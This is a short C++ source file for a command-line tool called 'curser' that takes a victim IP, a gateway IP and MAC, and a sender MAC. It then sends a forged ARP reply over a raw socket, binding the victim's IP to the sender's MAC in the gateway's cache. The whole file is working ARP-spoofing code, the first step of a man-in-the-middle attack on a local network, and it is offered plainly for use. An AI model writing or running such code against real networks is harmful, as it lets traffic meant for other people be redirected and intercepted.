#include <iostream>
#include "ll_endp.h"
#include "eth.h"
#include "arp.h"
#include "utils.h"
#include "raw_socket.h"


int main(int argc, char** argv) {
    static const char *usage = "Usage: curser [OPTIONS]\n"
                                "OPTIONS:\n\t-ifn   interface name\n\t"
                                "-vpa   victim ip\n\t"
                                "-sha   sender mac address\n\t"
                                "-gpa   gateway ip\n\t"
                                "-gha   gateway mac address";
    
    std::string_view ifname;
    uint32_t vpa = 0;
    uint32_t gpa = 0;
    uint8_t sha[6] = {0};
    uint8_t gha[6] = {0};

    if (argc < 8) {
        std::cout << usage << std::endl;
        return EXIT_FAILURE;
    } else {
        for (int i = 1; i < argc; i++) {
            if (!std::strcmp(argv[i], "-ifn")) {
                ifname = argv[++i];
            } else if (!std::strcmp(argv[i], "-vpa")) {
                vpa = inet_bf(argv[++i]);
            } else if (!std::strcmp(argv[i], "-gpa")) {
                gpa = inet_bf(argv[++i]);
            } else if (!std::strcmp(argv[i], "-sha")) {
                std::sscanf(argv[++i], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
                    &sha[0],
                    &sha[1],
                    &sha[2],
                    &sha[3],
                    &sha[4],
                    &sha[5]);
            } else if (!std::strcmp(argv[i], "-gha")) {
                std::sscanf(argv[++i], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                    &gha[0],
                    &gha[1],
                    &gha[2],
                    &gha[3],
                    &gha[4],
                    &gha[5]);
            } else if (!std::strcmp(argv[i], "-h")) {
                std::cout << usage << std::endl;
                return EXIT_SUCCESS;
            }
        }
    }
    
   
    ll_endpoint ep(ifname);
    raw_socket sock{};
    sock.bind(ep);
    
    auto arpBuilder = ArpBuilder()
        .set_hrd(0x0001)
        .set_pro(0x0800)
        .set_hln(6)
        .set_pln(4)
        .set_op(0x0002)
        .set_sha(sha)
        .set_spa(vpa)
        .set_tha(gha)
        .set_tpa(gpa);
    
    sock.sendto(arpBuilder.packet(), arpBuilder.size());
    std::cout << "sent arp reply on the interface " << ep << std::endl;
    return EXIT_SUCCESS;
}
